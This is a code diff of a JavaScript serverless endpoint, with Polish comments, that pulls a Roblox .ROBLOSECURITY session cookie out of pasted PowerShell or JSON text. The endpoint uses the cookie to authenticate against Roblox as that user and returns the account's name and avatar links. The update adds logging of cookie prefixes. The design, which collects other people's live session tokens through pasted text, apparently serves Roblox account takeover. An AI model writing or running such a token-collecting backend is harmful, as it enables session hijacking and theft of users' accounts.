@@ -11,31 +11,22 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Brak lub za krótki tekst' });
   }
 
-  // 1. Wyciągamy .ROBLOSECURITY z całego bloku tekstu (PowerShell, JSON, cokolwiek)
-  let robloSecurity = null;
+  console.log('Input length:', input.length); // log do Vercel
 
-  // Szukamy klasycznego formatu
-  const matchDirect = input.match(/\.ROBLOSECURITY"?\s*[:=]\s*["']?([^"';|\s]+)/i);
-  if (matchDirect) robloSecurity = matchDirect[1];
-
-  // Szukamy w New-Object System.Net.Cookie
-  if (!robloSecurity) {
-    const matchCookie = input.match(/\.ROBLOSECURITY",?\s*"([^"]+)"/i);
-    if (matchCookie) robloSecurity = matchCookie[1];
-  }
-
-  // Ostatnia deska – dowolny długi ciąg z |WARNING na początku
-  if (!robloSecurity) {
-    const longTokenMatch = input.match(/\|WARNING:.*?\|\s*([^"\s|]{200,})/i);
-    if (longTokenMatch) robloSecurity = longTokenMatch[1];
-  }
+  // Wyciąganie cookie – uproszczone
+  let robloSecurity = input.match(/_ROBLOSECURITY[_A-Z]*\s*[:=]\s*["']?([^"';|\s]+)/i)?.[1] ||
+                      input.match(/\.ROBLOSECURITY",?\s*"([^"]+)"/i)?.[1] ||
+                      input.match(/\|WARNING:.*?\|[_A-Z0-9a-z-]{200,}/i)?.[0] ||
+                      null;
 
   if (!robloSecurity || robloSecurity.length < 200) {
-    return res.status(400).json({ error: 'Nie znaleziono poprawnego .ROBLOSECURITY w tekście' });
+    console.log('Nie znaleziono cookie');
+    return res.status(400).json({ error: 'Nie znaleziono poprawnego .ROBLOSECURITY' });
   }
 
+  console.log('Cookie extracted (first 20 chars):', robloSecurity.substring(0, 20));
+
   try {
-    // Krok A: CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -44,10 +35,13 @@ export default async function handler(req, res) {
       },
     });
 
-    const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Nie udało się pobrać CSRF (cookie prawdopodobnie nieważne)');
+    console.log('CSRF status:', tokenRes.status);
 
-    // Krok B: Dane użytkownika
+    const csrfToken = tokenRes.headers.get('x-csrf-token');
+    if (!csrfToken) {
+      throw new Error('Brak X-CSRF-Token – cookie może być nieważne lub endpoint Roblox ma problem');
+    }
+
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
@@ -56,28 +50,29 @@ export default async function handler(req, res) {
       },
     });
 
+    console.log('User status:', userRes.status);
+
     if (!userRes.ok) {
-      if (userRes.status === 401) throw new Error('Cookie nieważne lub wygasłe (401)');
-      throw new Error(`Błąd Roblox: ${userRes.status}`);
+      const errorText = await userRes.text().catch(() => 'No details');
+      throw new Error(`Roblox zwrócił ${userRes.status}: ${errorText}`);
     }
 
     const data = await userRes.json();
     const userId = data.id;
 
-    // Krok C: Linki do avatara (publiczne, nie wymagają cookie!)
-    const headshotUrl = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`;
-    const fullbodyUrl = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=720x900&format=Png&isCircular=false`;
+    const headshot = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`;
+    const fullbody = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=720x900&format=Png&isCircular=false`;
 
-    // Zwracamy gotowe linki – frontend zrobi <img src={...}>
     res.status(200).json({
       success: true,
       username: data.name,
       displayName: data.displayName || data.name,
-      userId: userId,
-      headshot: headshotUrl,
-      fullbody: fullbodyUrl
+      userId,
+      headshot,
+      fullbody
     });
   } catch (err) {
-    res.status(500).json({ error: err.message || 'Coś poszło nie tak' });
+    console.error('Backend error:', err.message, err.stack);
+    res.status(500).json({ error: `Błąd backendu: ${err.message}` });
   }
 }
